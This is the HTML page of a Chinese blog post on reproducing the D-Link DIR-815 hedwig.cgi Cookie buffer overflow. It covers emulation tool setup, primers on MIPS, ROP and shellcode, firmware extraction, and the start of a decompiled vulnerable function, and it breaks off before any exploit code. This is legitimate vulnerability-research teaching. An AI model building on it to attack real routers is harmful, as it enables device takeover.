@@ -1,0 +1,886 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  data-theme="dark" >
+  <head>
+  <meta charset="utf-8">
+  
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'true');
+  </script>
+
+
+  
+  <script>
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "true");
+  </script>
+
+
+  
+  <script async src="https://hm.baidu.com/hm.js?true"></script>
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    _hmt.push(["_trackPageview", location.pathname]);
+  </script>
+
+
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.clipboard_tips = {"success":"我是复制糕手!(*^▽^*)!","fail":"一拳一个不让复制![○･｀Д´･ ○]","copyright":{"enable":true,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.outdate = {"enable":true,"daysAgo":180,"message":"本文最后更新于 {time}，请注意文中内容可能已经发生变化。"};window.REIMU_CONFIG.anchor_icon = 'f2dc';</script>
+  
+  
+  <title>
+    DIR-815 |
+    
+    Dusk的怪东西
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/regular.min.css">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/solid.min.css">
+
+    <link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/brands.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<link rel="preload" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="DIR-815漏洞的复现路程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DIR-815">
+<meta property="og:url" content="https://fallingdusky.github.io/2024/11/25/DIR-815/index.html">
+<meta property="og:site_name" content="Dusk的怪东西">
+<meta property="og:description" content="DIR-815漏洞的复现路程">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/11/25/nlSzaiYCTjcx6Wq.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/17/ao6jsVUKHCxEweT.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/25/lSZsvrNK4FkDA9d.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/25/qsF32ANrUjP9gbX.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/25/dpS8Jkhf3ulmIjY.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/25/AMxVGf8a3FmzreQ.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/25/1ebxOmzDNsXRn3F.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/25/KJ7BYrcnCQsTzui.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/25/VathWMnbwuG7Uqr.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/25/ohJwxHC2fc4TykO.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/25/gtKcnEZGsoBAVhS.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20241125214530-895074dc-ab33-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20241125214616-a47e2d08-ab33-1.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/25/zZ1YkRuDaHfIJm8.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/25/FV1EmXf3wqtr5WB.png">
+<meta property="article:published_time" content="2024-11-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-11-29T13:05:17.849Z">
+<meta property="article:author" content="Dusk">
+<meta property="article:tag" content="IOT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/11/25/nlSzaiYCTjcx6Wq.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Dusk的怪东西" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">格林...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon ">
+            &#xf2dc;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="DIR-815">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">DIR-815</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-DIR-815" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2024/11/25/DIR-815/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2024-11-24T16:00:00.000Z" itemprop="datePublished">2024-11-25</time>
+    <time style="display: none;" id="post-update-time">2024-11-29</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/" data-aos="zoom-in">物联网安全</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote id="outdate-blockquote" style="display: none;"><p></p></blockquote>
+      
+      
+        <h1 id="前置条件"><a class="markdownIt-Anchor" href="#前置条件"></a> 前置条件：</h1>
+<h2 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具：</h2>
+<p>建议Ubuntu18.04及以上且<strong>是纯净版本</strong></p>
+<h3 id="binwalk"><a class="markdownIt-Anchor" href="#binwalk"></a> binwalk</h3>
+<p><code>sudo apt install binawlk</code></p>
+<h3 id="firmware-mod-kit"><a class="markdownIt-Anchor" href="#firmware-mod-kit"></a> firmware-mod-kit</h3>
+<p>安装之前得先安装环境</p>
+<p>Ubuntu18.04及前</p>
+<p><code>sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic autoconf</code></p>
+<p>Ubuntu20.04及后</p>
+<p><code>sudo apt-get install git build-essential zlib1g-dev liblzma-dev python3-magic autoconf python-is-python3</code></p>
+<p>环境配好后就可以安装firmware-mod-kit了</p>
+<p><code>git clone https://github.com/rampageX/firmware-mod-kit.git</code></p>
+<h3 id="firmae"><a class="markdownIt-Anchor" href="#firmae"></a> FirmAE</h3>
+<p><strong>强烈建议拉项目前存个快照</strong></p>
+<p>拉项目</p>
+<p><code>git clone --recursive https://github.com/pr0v3rbs/FirmAE</code></p>
+<p>之后进入文件夹依次执行以下三个<code>sh</code>文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./download.sh</span><br><span class="line">sudo ./install.sh</span><br><span class="line">sudo ./init.sh</span><br></pre></td></tr></table></figure>
+<h4 id="常见问题"><a class="markdownIt-Anchor" href="#常见问题"></a> 常见问题</h4>
+<h5 id="downloadsh"><a class="markdownIt-Anchor" href="#downloadsh"></a> <a target="_blank" rel="noopener" href="http://download.sh">download.sh</a></h5>
+<p>download里的网站基本全在海外，所以常常出现没法全部拉下来的场面</p>
+<p>我的建议是，要么走<strong>代理</strong></p>
+<p>要么就<strong>把sh文件里的网站复制下来在宿主机里的浏览器中下载</strong>，也就是亲力亲为一个个下，再<strong>复制粘贴到binaries</strong></p>
+<h5 id="installsh"><a class="markdownIt-Anchor" href="#installsh"></a> <a target="_blank" rel="noopener" href="http://install.sh">install.sh</a></h5>
+<p>跑之前给点建议：</p>
+<p>1.如果你有qemu环境，就<strong>注释掉sh里的以下代码</strong>，否则很有可能将你的qemu环境弄得一团糟</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils</span><br></pre></td></tr></table></figure>
+<p>2.网络问题是典中典，建议<strong>走代理</strong></p>
+<p>3.这玩意会给你安一个<strong>postgresql</strong>,小心环境紊乱</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y postgresql</span><br></pre></td></tr></table></figure>
+<p>综上：</p>
+<p>​	如果你执行完它再重启Ubuntu后，失去了图形化界面，那就是没救了，<strong>回快照</strong>吧，环境崩了</p>
+<h4 id="使用仿真常见小问题"><a class="markdownIt-Anchor" href="#使用仿真常见小问题"></a> 使用仿真常见小问题</h4>
+<h5 id="target-is-busy"><a class="markdownIt-Anchor" href="#target-is-busy"></a> <code>target is busy.</code></h5>
+<p>这玩意基本就是因为没有正常退出仿真导致的</p>
+<p>查看挂载点</p>
+<p>命令：<code>mount | grep pathto/FirmAE/scratch/targetID/image</code></p>
+<p>删掉挂载点</p>
+<p>命令：<code>sudo umount -f pathto/FirmAE/scratch/targetID/image</code></p>
+<p>​	 or   <code>sudo umount --lazy pathto/FirmAE/scratch/1/image</code>（可以两个指令联用）</p>
+<p>有时候这玩意会抽风，得尝试好几次，不知道啥原因</p>
+<h5 id="address-already-in-use"><a class="markdownIt-Anchor" href="#address-already-in-use"></a> <code>Address already in use</code></h5>
+<p>成因同上</p>
+<p>删除占用端口</p>
+<p>命令：先查看<code>sudo lsof -i -P -n | grep LISTEN</code></p>
+<p>​			后删除<code>sudo kill -9 &lt;PID&gt;</code></p>
+<h3 id="ida的mipsrop插件"><a class="markdownIt-Anchor" href="#ida的mipsrop插件"></a> IDA的mipsrop插件</h3>
+<p>旧一点的IDAPython的版本一般是python2版本，并且mipsrop.py脚本也是按照python2格式来写的，这就导致你如果IDAPython的版本高于3，就会有mipsrop.py脚本不适配，得一个个修改，甚至修改了还是运行不了，还好网上有大佬已经弄好适配python3版本的mipsrop.py了，但我自己搜的时候弄的好痛苦，基本都是介绍python2 的版本，很麻烦，所以我把该链接分享出来</p>
+<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-266102.htm">求助]IDA 无法安装mipsrop插件-求助问答-看雪-安全社区|安全招聘|kanxue.com</a></p>
+<p>需要下载的zip包就在评论区里，往下滑很快的，经本人亲自尝试，可支持IDA8.3甚至是IDAPro9.0</p>
+<p>解压后直接把以下文件丢到IDA根目录下的plugins即可</p>
+<p><img src="https://s2.loli.net/2024/11/25/nlSzaiYCTjcx6Wq.png" alt="image-20241125212843749" /></p>
+<h4 id="常见问题nameerror-name-mipsrop-is-not-defined"><a class="markdownIt-Anchor" href="#常见问题nameerror-name-mipsrop-is-not-defined"></a> 常见问题：<strong>NameError: name ‘mipsrop’ is not defined</strong></h4>
+<p>解决方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mipsrop</span><br><span class="line">mipsrop = mipsrop.MIPSROPFinder()</span><br></pre></td></tr></table></figure>
+<h4 id="常使用模块"><a class="markdownIt-Anchor" href="#常使用模块"></a> 常使用模块</h4>
+<p>寻找特定gadget</p>
+<p><code>mipsrop.find(&quot;the asm you want to search&quot;)</code></p>
+<p>主要针对栈相关的gadget<br />
+<code>mipsrop.stackfinders()</code></p>
+<h2 id="知识点"><a class="markdownIt-Anchor" href="#知识点"></a> 知识点：</h2>
+<h3 id="基础溢出"><a class="markdownIt-Anchor" href="#基础溢出"></a> 基础溢出</h3>
+<p>有点Pwn基础的上手会很快，简单解释下什么是溢出。一般都是由于<strong>缓冲区溢出</strong>等原因导致攻击者能够<strong>控制程序执行流</strong>，来<strong>执行恶意代码</strong>，达到攻击目的。在这就是对路由器进行挟持了。</p>
+<p>常见的攻击方式有<code>Shellcode</code>和<code>ROP</code></p>
+<h4 id="shellcode"><a class="markdownIt-Anchor" href="#shellcode"></a> Shellcode</h4>
+<p>Shellcode的本质是<strong>机械码</strong>，攻击者通过精心构建的Shellcode，来执行恶意代码，最终达到攻击目的。一般的Shellcode由<strong>汇编</strong>辅助编写而成，所以常见的都是用汇编写Shellcode</p>
+<h4 id="rop"><a class="markdownIt-Anchor" href="#rop"></a> ROP</h4>
+<p><code>ROP</code>即返回导向编程。通过利用程序中各种<strong>细碎的代码段</strong>(也称为<code>gadget</code>如<code>pop | ret</code>)串成一段恶意代码，这段恶意代码有着<strong>控制寄存器、系统调用</strong>等功能，通过溢出劫持返回地址执行这段代码，达到攻击目的</p>
+<h3 id="http协议"><a class="markdownIt-Anchor" href="#http协议"></a> HTTP协议</h3>
+<p>有web基础基本就可以跳了，简要介绍下</p>
+<p>HTTP(即HyperText Transfer Protocol)是一种<strong>超文本传输协议</strong>，是Web上进行任何数据交换的基础，也是一种<strong>客户端-服务器</strong>协议.</p>
+<p>它由<strong>请求和响应</strong>组成，而请求的各个部分分别是<strong>请求行、消息报头、请求正文</strong>。</p>
+<h5 id="请求行"><a class="markdownIt-Anchor" href="#请求行"></a> 请求行</h5>
+<p><code>Method Request-URI HTTP-Version CRLF</code></p>
+<h5 id="消息报头"><a class="markdownIt-Anchor" href="#消息报头"></a> 消息报头</h5>
+<p>包含若干字段，通常以 <code>key: value</code> 的格式表示，如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 348</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+<h5 id="请求正文"><a class="markdownIt-Anchor" href="#请求正文"></a> 请求正文</h5>
+<p>HTTP请求正文是请求消息中可选的部分，通常用于在 <code>POST</code>、<code>PUT</code> 或其他需要传递数据的请求中，携带客户端向服务器发送的数据。它是位于请求头之后的实际数据内容。可由多种数据组成，如表单、二进制、JSON等，如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/user HTTP/1.1</span><br><span class="line">Host: api.example.com</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 55</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;12345&quot;,</span><br><span class="line">  &quot;remember_me&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>Content-Type</code>来判断请求正文的格式，JSON格式的内容则是请求正文</p>
+<h3 id="mips架构"><a class="markdownIt-Anchor" href="#mips架构"></a> MIPS架构</h3>
+<h4 id="寄存器"><a class="markdownIt-Anchor" href="#寄存器"></a> 寄存器</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">zero -&gt; 值始终为0</span><br><span class="line">$at -&gt; 保留给汇编器</span><br><span class="line">$v0-$v1 -&gt; 保存表达式返回结果</span><br><span class="line">$a0-$v3 -&gt; 函数参数，类比rdi,rsi...的顺序，超过4个则用堆栈传递</span><br><span class="line">$t0-t9 -&gt; 临时寄存器，其中t8,t9是扩展，且t9常用来调用函数</span><br><span class="line">$s0-$s7 -&gt; 保存寄存器，保存一些函数调用时必要的值</span><br><span class="line">$k0-$k1 -&gt; 留给系统中断处理的时候使用</span><br><span class="line">$gp -&gt; 全局指针</span><br><span class="line">$sp -&gt; 堆栈指针，类比rsp</span><br><span class="line">$fp -&gt; 栈帧指针</span><br><span class="line">$ra -&gt; 返回地址，类比ret</span><br></pre></td></tr></table></figure>
+<h4 id="基础汇编"><a class="markdownIt-Anchor" href="#基础汇编"></a> 基础汇编</h4>
+<h5 id="load和store"><a class="markdownIt-Anchor" href="#load和store"></a> LOAD和STORE</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">l==&gt;LOAD</span><br><span class="line">s==&gt;STORE</span><br><span class="line">不同的后缀代表不同的数据大小</span><br><span class="line">w==&gt;word</span><br><span class="line">h==&gt;half</span><br><span class="line">b==&gt;byte</span><br><span class="line">u==&gt;unsigned</span><br><span class="line">i==&gt;immediate</span><br></pre></td></tr></table></figure>
+<h5 id="指令格式"><a class="markdownIt-Anchor" href="#指令格式"></a> 指令格式</h5>
+<h6 id="r型"><a class="markdownIt-Anchor" href="#r型"></a> R型</h6>
+<p><code>opcode | first source res | second source res | destination res | offset | funct(这个参数不用了解，毕竟我们看的常常是汇编)</code></p>
+<h6 id="i型"><a class="markdownIt-Anchor" href="#i型"></a> I型</h6>
+<p><code> opcode | source res | destination res | addr_offset</code></p>
+<h6 id="j型"><a class="markdownIt-Anchor" href="#j型"></a> J型</h6>
+<p><code>opcode | target_addr</code></p>
+<h5 id="常见汇编"><a class="markdownIt-Anchor" href="#常见汇编"></a> 常见汇编</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add</span><br><span class="line">jr==jmp，常跟ra</span><br><span class="line">jalr，效果近似于jmp，后边常跟t9调用函数</span><br></pre></td></tr></table></figure>
+<h4 id="流水线指令集特性之一分支延迟效应"><a class="markdownIt-Anchor" href="#流水线指令集特性之一分支延迟效应"></a> 流水线指令集特性之一：分支延迟效应</h4>
+<p><strong>流水线效应</strong>最常见的就是跳转指令（如<code>jalr</code>）导致的<strong>分支延迟效应</strong>，当它跳转指令填充好跳转地址但尚未跳转过去时，它会优先执行该跳转指令的下一条指令，如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jalr    $t9</span><br><span class="line">addiu   $s0, 1</span><br></pre></td></tr></table></figure>
+<p><strong>在还未跳转到t9时，会执行addiu汇编，然后再进行跳转</strong>，可以理解为同时执行了两条指令</p>
+<h2 id="硬件下载地址"><a class="markdownIt-Anchor" href="#硬件下载地址"></a> 硬件下载地址：</h2>
+<p><code>https://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/</code></p>
+<h1 id="漏洞成因"><a class="markdownIt-Anchor" href="#漏洞成因"></a> 漏洞成因：</h1>
+<p><img src="https://s2.loli.net/2024/11/17/ao6jsVUKHCxEweT.png" alt="image-20241117132347511" /></p>
+<p><strong>Cookie头</strong>的<code>hedwig.cgi</code>远程缓冲区溢出</p>
+<h1 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析：</h1>
+<p>我们先从固件包下手</p>
+<p><code>binwalk -Me DIR-815-FW-1.01b14_1.01b14.bin</code></p>
+<p>获得以下文件</p>
+<p><img src="https://s2.loli.net/2024/11/25/lSZsvrNK4FkDA9d.png" alt="image-20241125023313081" /></p>
+<p>根据漏洞报告里说与<code>hedwig.cgi</code>和<code>Cookie</code>有关，我们从固件里<strong>提取出相关二进制文件</strong>，并就着<code>Cookie</code>进行寻找</p>
+<p><img src="https://s2.loli.net/2024/11/25/qsF32ANrUjP9gbX.png" alt="image-20241125023442283" /></p>
+<p><img src="https://s2.loli.net/2024/11/25/dpS8Jkhf3ulmIjY.png" alt="image-20241125023510381" /></p>
+<p>在<code>sess_get_uid</code>函数里发现了利用，我们先在<strong>交叉引用中寻找与漏洞名有关的函数</strong>	 发现在<code>hedwigcgi_main</code>函数中进行了调用，进入该函数看看做了什么</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hedwigcgi_main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// $a1</span></span><br><span class="line">  FILE *v2; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $fp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *<span class="built_in">string</span>; <span class="comment">// $v0</span></span><br><span class="line">  FILE *v7; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $s7</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> **v11; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">char</span> *v13; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v14; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> *v16; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v17; <span class="comment">// $s1</span></span><br><span class="line"> 